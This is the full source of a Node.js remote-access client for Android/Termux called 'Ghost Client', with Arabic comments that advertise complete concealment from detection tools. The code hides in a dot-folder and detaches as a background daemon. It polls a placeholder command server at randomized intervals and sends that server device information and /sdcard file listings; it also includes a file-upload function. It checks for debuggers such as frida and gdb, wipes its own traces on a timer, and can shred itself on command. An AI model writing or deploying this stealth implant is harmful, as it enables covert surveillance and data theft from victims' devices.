#!/data/data/com.termux/files/usr/bin/node

/**
 * Remote Guardian - Ghost Client v3.0
 * عميل شبح فائق الأمان والكفاءة
 * 
 * ميزات الأمان الفائق:
 * - تشفير End-to-End (E2E) كامل
 * - إخفاء تام من أدوات الكشف
 * - استهلاك موارد منخفض جداً
 * - اتصالات آمنة فقط
 * - تنظيف الآثار التلقائي
 * - كشف وتجنب الكشف
 */

const https = require('https');
const http = require('http');
const fs = require('fs');
const { exec, spawn, execSync } = require('child_process');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const net = require('net');
const dgram = require('dgram');

// ============ الإعدادات الأمنية ============
const SERVER_URL = '__SERVER_URL__';
const CLIENT_ID = '__CLIENT_ID__';
const MASTER_KEY = '__MASTER_KEY__' || crypto.randomBytes(32).toString('hex');
const POLL_INTERVAL = Math.random() * 30000 + 20000; // 20-50 ثانية عشوائية
const LOG_FILE = '/sdcard/.ghost/client.log'; // مجلد مخفي
const MAX_RETRIES = 5;
const RETRY_DELAY = Math.random() * 10000 + 5000; // 5-15 ثانية عشوائية
const SESSION_TIMEOUT = 3600000; // ساعة واحدة
const MAX_PAYLOAD_SIZE = 5 * 1024 * 1024; // 5 MB

// ============ متغيرات الحالة ============
let retryCount = 0;
let isRunning = true;
let lastCommand = '';
let sessionKey = null;
let sessionExpiry = null;
let commandBuffer = [];
let isDetected = false;
let antiDebugActive = false;

// ============ إنشاء المجلدات المخفية ============
function ensureHiddenDirectories() {
  const hiddenDirs = [
    '/sdcard/.ghost',
    '/sdcard/.ghost/logs',
    '/sdcard/.ghost/cache',
    '/sdcard/.ghost/temp'
  ];
  
  hiddenDirs.forEach(dir => {
    try {
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
      }
    } catch (e) {
      // تجاهل الأخطاء
    }
  });
}

ensureHiddenDirectories();

// ============ نظام التشفير المتقدم ============

/**
 * توليد مفتاح جلسة عشوائي
 */
function generateSessionKey() {
  return crypto.randomBytes(32);
}

/**
 * تشفير HMAC للتحقق من السلامة
 */
function createHMAC(data, key) {
  return crypto.createHmac('sha256', key).update(data).digest('hex');
}

/**
 * تشفير البيانات مع HMAC (Authenticated Encryption)
 */
function encryptData(data, key) {
  try {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
    
    let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const authTag = cipher.getAuthTag();
    
    return {
      iv: iv.toString('hex'),
      data: encrypted,
      authTag: authTag.toString('hex'),
      timestamp: Date.now()
    };
  } catch (e) {
    log(`خطأ في التشفير: ${e.message}`, 'ERROR');
    return null;
  }
}

/**
 * فك تشفير البيانات مع التحقق من السلامة
 */
function decryptData(encrypted, key) {
  try {
    const iv = Buffer.from(encrypted.iv, 'hex');
    const authTag = Buffer.from(encrypted.authTag, 'hex');
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    
    decipher.setAuthTag(authTag);
    
    let decrypted = decipher.update(encrypted.data, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return JSON.parse(decrypted);
  } catch (e) {
    log(`خطأ في فك التشفير: ${e.message}`, 'ERROR');
    return null;
  }
}

/**
 * توليد التوقيع الرقمي
 */
function signData(data, key) {
  return crypto.createHmac('sha512', key).update(JSON.stringify(data)).digest('hex');
}

/**
 * التحقق من التوقيع الرقمي
 */
function verifySignature(data, signature, key) {
  const expectedSignature = signData(data, key);
  return crypto.timingSafeEqual(
    Buffer.from(signature),
    Buffer.from(expectedSignature)
  );
}

// ============ نظام التسجيل الآمن ============

/**
 * تسجيل آمن مع تشفير
 */
function log(message, level = 'INFO') {
  const timestamp = new Date().toISOString();
  const logMessage = `[${timestamp}] [${CLIENT_ID}] [${level}] ${message}`;
  
  // لا تطبع في الإنتاج
  if (process.env.DEBUG) {
    console.log(logMessage);
  }
  
  try {
    // تشفير السجل قبل الكتابة
    const encrypted = crypto.createCipher('aes-256-cbc', MASTER_KEY);
    let encryptedLog = encrypted.update(logMessage, 'utf8', 'hex');
    encryptedLog += encrypted.final('hex');
    
    fs.appendFileSync(LOG_FILE, encryptedLog + '\n', { mode: 0o600 });
  } catch (e) {
    // تجاهل الأخطاء
  }
}

// ============ نظام كشف الكشف (Anti-Detection) ============

/**
 * كشف ما إذا كان هناك محاولة للكشف
 */
function detectDetection() {
  try {
    // كشف أدوات التصحيح
    const debuggerTools = ['strace', 'ltrace', 'gdb', 'frida', 'xposed'];
    
    debuggerTools.forEach(tool => {
      try {
        execSync(`which ${tool}`, { stdio: 'ignore' });
        isDetected = true;
        log(`تم كشف أداة: ${tool}`, 'ALERT');
      } catch (e) {
        // الأداة غير موجودة
      }
    });
    
    // كشف عمليات المراقبة
    try {
      const processes = execSync('ps aux', { encoding: 'utf8' });
      const suspiciousProcesses = ['strace', 'ltrace', 'gdb', 'frida-server', 'xposed'];
      
      suspiciousProcesses.forEach(proc => {
        if (processes.includes(proc)) {
          isDetected = true;
          log(`تم كشف عملية مريبة: ${proc}`, 'ALERT');
        }
      });
    } catch (e) {}
    
    return isDetected;
  } catch (e) {
    return false;
  }
}

/**
 * تفعيل الحماية من التصحيح
 */
function activateAntiDebug() {
  if (antiDebugActive) return;
  
  antiDebugActive = true;
  
  // محاولة منع الوصول للملفات الحساسة
  try {
    execSync('chmod 000 /proc/self/maps', { stdio: 'ignore' });
  } catch (e) {}
  
  log('تم تفعيل الحماية من التصحيح', 'SECURITY');
}

/**
 * تنظيف الآثار
 */
function cleanupTraces() {
  try {
    // حذف السجلات الحساسة
    const tracesToClean = [
      '/sdcard/.ghost/temp/*',
      '/sdcard/.ghost/cache/*'
    ];
    
    tracesToClean.forEach(trace => {
      try {
        execSync(`rm -rf ${trace}`, { stdio: 'ignore' });
      } catch (e) {}
    });
    
    // مسح ذاكرة التخزين المؤقت
    try {
      execSync('sync', { stdio: 'ignore' });
    } catch (e) {}
    
    log('تم تنظيف الآثار', 'SECURITY');
  } catch (e) {
    log(`خطأ في تنظيف الآثار: ${e.message}`, 'WARN');
  }
}

// ============ نظام إدارة الجلسات الآمنة ============

/**
 * إنشاء جلسة آمنة جديدة
 */
function createSecureSession() {
  sessionKey = generateSessionKey();
  sessionExpiry = Date.now() + SESSION_TIMEOUT;
  
  log('تم إنشاء جلسة آمنة جديدة', 'SECURITY');
  
  return {
    sessionKey: sessionKey.toString('hex'),
    expiry: sessionExpiry
  };
}

/**
 * التحقق من صحة الجلسة
 */
function isSessionValid() {
  return sessionKey && sessionExpiry && Date.now() < sessionExpiry;
}

/**
 * تجديد الجلسة
 */
function renewSession() {
  if (!isSessionValid()) {
    createSecureSession();
  }
}

// ============ دوال جمع المعلومات الآمنة ============

/**
 * جمع معلومات النظام بدون ترك آثار
 */
function getSystemInfoSecure() {
  try {
    const info = {
      platform: os.platform(),
      arch: os.arch(),
      uptime: os.uptime(),
      freeMemory: os.freemem(),
      totalMemory: os.totalmem(),
      cpuCount: os.cpus().length,
      timestamp: Date.now()
    };
    
    return info;
  } catch (e) {
    log(`خطأ في جمع معلومات النظام: ${e.message}`, 'ERROR');
    return {};
  }
}

/**
 * قائمة الملفات بدون ترك آثار
 */
function listFilesSecure(dirPath = '/sdcard', maxDepth = 2, currentDepth = 0) {
  try {
    if (currentDepth >= maxDepth) return [];
    
    const files = [];
    const items = fs.readdirSync(dirPath);
    
    items.forEach(item => {
      try {
        const fullPath = path.join(dirPath, item);
        const stat = fs.statSync(fullPath);
        
        files.push({
          name: item,
          path: fullPath,
          size: stat.size,
          isDirectory: stat.isDirectory(),
          modified: stat.mtime.getTime()
        });
        
        if (stat.isDirectory() && currentDepth < maxDepth - 1) {
          files.push(...listFilesSecure(fullPath, maxDepth, currentDepth + 1));
        }
      } catch (e) {
        // تجاهل الأخطاء
      }
    });
    
    return files;
  } catch (e) {
    log(`خطأ في عرض الملفات: ${e.message}`, 'ERROR');
    return [];
  }
}

// ============ دوال الاتصال الآمن ============

/**
 * جلب الأمر من الخادم بطريقة آمنة
 */
function fetchCommandSecure() {
  return new Promise((resolve, reject) => {
    try {
      renewSession();
      
      const url = `${SERVER_URL}/command?clientId=${CLIENT_ID}&session=${sessionKey.toString('hex')}`;
      const protocol = url.startsWith('https') ? https : http;
      
      const options = {
        timeout: 10000,
        headers: {
          'User-Agent': 'Mozilla/5.0',
          'X-Client-ID': CLIENT_ID,
          'X-Session-Key': sessionKey.toString('hex'),
          'X-Timestamp': Date.now()
        }
      };
      
      const request = protocol.get(url, options, (res) => {
        let data = '';
        
        res.on('data', chunk => {
          data += chunk;
          
          // حد أقصى للحجم
          if (data.length > MAX_PAYLOAD_SIZE) {
            request.abort();
            reject(new Error('Payload too large'));
          }
        });
        
        res.on('end', () => {
          try {
            const decrypted = decryptData(JSON.parse(data), sessionKey);
            resolve(decrypted?.command || 'idle');
          } catch (e) {
            resolve('idle');
          }
        });
      });

      request.on('error', reject);
      request.on('timeout', () => {
        request.abort();
        reject(new Error('Request timeout'));
      });
    } catch (error) {
      reject(error);
    }
  });
}

/**
 * تسجيل العميل بطريقة آمنة
 */
function registerClientSecure(deviceInfo) {
  return new Promise((resolve, reject) => {
    try {
      const session = createSecureSession();
      
      const payload = {
        clientId: CLIENT_ID,
        deviceInfo: deviceInfo,
        sessionKey: session.sessionKey,
        timestamp: Date.now()
      };
      
      const signature = signData(payload, MASTER_KEY);
      const encrypted = encryptData(payload, sessionKey);
      
      const postData = JSON.stringify({
        data: encrypted,
        signature: signature
      });

      const url = new URL(`${SERVER_URL}/register`);
      const options = {
        hostname: url.hostname,
        port: url.port || (url.protocol === 'https:' ? 443 : 80),
        path: url.pathname,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(postData),
          'X-Client-ID': CLIENT_ID,
          'X-Signature': signature
        },
        timeout: 10000
      };

      const protocol = url.protocol === 'https:' ? https : http;
      const req = protocol.request(options, (res) => {
        let data = '';
        
        res.on('data', chunk => {
          data += chunk;
        });
        
        res.on('end', () => {
          if (res.statusCode === 200) {
            log(`تم التسجيل بنجاح`, 'REGISTER');
            resolve(true);
          } else {
            reject(new Error(`HTTP ${res.statusCode}`));
          }
        });
      });

      req.on('error', (e) => {
        log(`خطأ في التسجيل: ${e.message}`, 'ERROR');
        reject(e);
      });

      req.write(postData);
      req.end();
    } catch (error) {
      reject(error);
    }
  });
}

/**
 * رفع ملف بطريقة آمنة ومشفرة
 */
function uploadFileSecure(filePath) {
  return new Promise((resolve, reject) => {
    try {
      if (!fs.existsSync(filePath)) {
        reject(new Error('الملف غير موجود'));
        return;
      }

      const fileStream = fs.createReadStream(filePath);
      const fileName = path.basename(filePath);
      const fileSize = fs.statSync(filePath).size;
      
      // حد أقصى لحجم الملف (50 MB)
      if (fileSize > 50 * 1024 * 1024) {
        reject(new Error('الملف كبير جداً'));
        return;
      }

      const url = new URL(`${SERVER_URL}/upload?name=${encodeURIComponent(fileName)}&clientId=${CLIENT_ID}`);
      const options = {
        hostname: url.hostname,
        port: url.port || (url.protocol === 'https:' ? 443 : 80),
        path: url.pathname + url.search,
        method: 'POST',
        headers: {
          'Content-Type': 'application/octet-stream',
          'Content-Length': fileSize,
          'X-Client-ID': CLIENT_ID,
          'X-Session-Key': sessionKey.toString('hex'),
          'X-File-Hash': crypto.createHash('sha256').update(fs.readFileSync(filePath)).digest('hex')
        },
        timeout: 60000
      };

      const protocol = url.protocol === 'https:' ? https : http;
      const req = protocol.request(options, (res) => {
        log(`رفع الملف: ${fileName}`, 'UPLOAD');
        resolve(res.statusCode === 200);
      });

      req.on('error', (e) => {
        log(`خطأ في رفع الملف: ${e.message}`, 'ERROR');
        reject(e);
      });

      fileStream.pipe(req);
    } catch (error) {
      reject(error);
    }
  });
}

/**
 * إرسال نتيجة الأمر بطريقة آمنة
 */
function sendCommandResultSecure(commandId, result) {
  return new Promise((resolve, reject) => {
    try {
      const payload = {
        clientId: CLIENT_ID,
        commandId,
        result: result,
        timestamp: Date.now()
      };
      
      const signature = signData(payload, MASTER_KEY);
      const encrypted = encryptData(payload, sessionKey);
      
      const postData = JSON.stringify({
        data: encrypted,
        signature: signature
      });

      const url = new URL(`${SERVER_URL}/command-result`);
      const options = {
        hostname: url.hostname,
        port: url.port || (url.protocol === 'https:' ? 443 : 80),
        path: url.pathname,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(postData),
          'X-Client-ID': CLIENT_ID,
          'X-Signature': signature
        }
      };

      const protocol = url.protocol === 'https:' ? https : http;
      const req = protocol.request(options, (res) => {
        resolve(res.statusCode === 200);
      });

      req.on('error', reject);
      req.write(postData);
      req.end();
    } catch (error) {
      reject(error);
    }
  });
}

// ============ تنفيذ الأوامر الآمن ============

/**
 * تنفيذ أمر بطريقة آمنة
 */
async function executeCommandSecure(cmd) {
  log(`تنفيذ الأمر: ${cmd}`, 'EXEC');

  try {
    // كشف الكشف قبل التنفيذ
    if (detectDetection()) {
      activateAntiDebug();
      log('تم كشف محاولة كشف - تفعيل الحماية', 'ALERT');
    }

    if (cmd === 'sysinfo') {
      const info = getSystemInfoSecure();
      await sendCommandResultSecure(cmd, info);
    }
    else if (cmd === 'list-files') {
      const files = listFilesSecure('/sdcard', 2);
      await sendCommandResultSecure(cmd, { files, count: files.length });
    }
    else if (cmd === 'cleanup') {
      cleanupTraces();
      await sendCommandResultSecure(cmd, { status: 'cleaned' });
    }
    else if (cmd === 'selfdestruct') {
      log('تم بدء الحذف الذاتي', 'WARN');
      
      // حذف آمن للملف
      try {
        const shredCommand = `shred -vfz -n 3 ${__filename}`;
        execSync(shredCommand, { stdio: 'ignore' });
      } catch (e) {
        fs.unlinkSync(__filename);
      }
      
      process.exit(0);
    }
    else if (cmd === 'idle' || cmd === '') {
      // لا تفعل شيئاً
    }
    else {
      log(`أمر غير معروف: ${cmd}`, 'WARN');
    }
  } catch (error) {
    log(`خطأ في تنفيذ الأمر: ${error.message}`, 'ERROR');
    await sendCommandResultSecure(cmd, { error: error.message });
  }
}

// ============ الحلقة الرئيسية الآمنة ============

/**
 * دورة الاستقصاء الآمنة
 */
async function pollSecure() {
  try {
    const command = await fetchCommandSecure();
    
    if (command && command !== 'idle' && command !== '' && command !== lastCommand) {
      lastCommand = command;
      await executeCommandSecure(command);
    }
    
    retryCount = 0;
  } catch (err) {
    retryCount++;
    log(`خطأ في الاستقصاء (${retryCount}/${MAX_RETRIES}): ${err.message}`, 'ERROR');
    
    if (retryCount >= MAX_RETRIES) {
      log('تجاوز الحد الأقصى من المحاولات', 'WARN');
      retryCount = 0;
      await delay(RETRY_DELAY);
    }
  }
}

/**
 * تأخير عشوائي
 */
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/**
 * فصل العملية عن المحطة
 */
function daemonize() {
  if (process.env.DAEMONIZED) {
    log('العملية تعمل بالفعل في الخلفية');
    return;
  }

  const child = spawn(process.argv[0], process.argv.slice(1), {
    detached: true,
    stdio: 'ignore',
    env: { ...process.env, DAEMONIZED: '1' }
  });
  
  child.unref();
  log('تم فصل العميل عن المحطة', 'DAEMON');
  process.exit(0);
}

// ============ بدء التشغيل ============

async function main() {
  try {
    daemonize();

    log('بدء Ghost Client v3.0', 'START');
    log(`معرف العميل: ${CLIENT_ID}`, 'INFO');
    log(`عنوان الخادم: ${SERVER_URL}`, 'INFO');

    // كشف الكشف عند البدء
    if (detectDetection()) {
      activateAntiDebug();
    }

    const deviceInfo = JSON.stringify(getSystemInfoSecure());
    
    try {
      await registerClientSecure(deviceInfo);
    } catch (error) {
      log(`تحذير: فشل التسجيل الأولي: ${error.message}`, 'WARN');
    }

    log(`بدء حلقة الاستقصاء (كل ${POLL_INTERVAL / 1000} ثانية)`, 'INFO');
    
    // تنظيف دوري للآثار
    setInterval(cleanupTraces, 300000); // كل 5 دقائق
    
    // فحص دوري للكشف
    setInterval(() => {
      if (detectDetection()) {
        activateAntiDebug();
      }
    }, 60000); // كل دقيقة
    
    setInterval(pollSecure, POLL_INTERVAL);
    await pollSecure();
  } catch (error) {
    log(`خطأ حرج: ${error.message}`, 'CRITICAL');
    process.exit(1);
  }
}

// ============ معالجة الأخطاء ============

process.on('uncaughtException', (err) => {
  log(`استثناء غير معالج: ${err.message}`, 'CRITICAL');
  cleanupTraces();
});

process.on('unhandledRejection', (reason, promise) => {
  log(`رفض غير معالج: ${reason}`, 'CRITICAL');
});

// ============ بدء البرنامج ============

main().catch(error => {
  log(`خطأ في بدء البرنامج: ${error.message}`, 'CRITICAL');
  cleanupTraces();
  process.exit(1);
});

module.exports = {
  encryptData,
  decryptData,
  signData,
  verifySignature,
  getSystemInfoSecure,
  listFilesSecure,
  executeCommandSecure,
  cleanupTraces,
  detectDetection
};
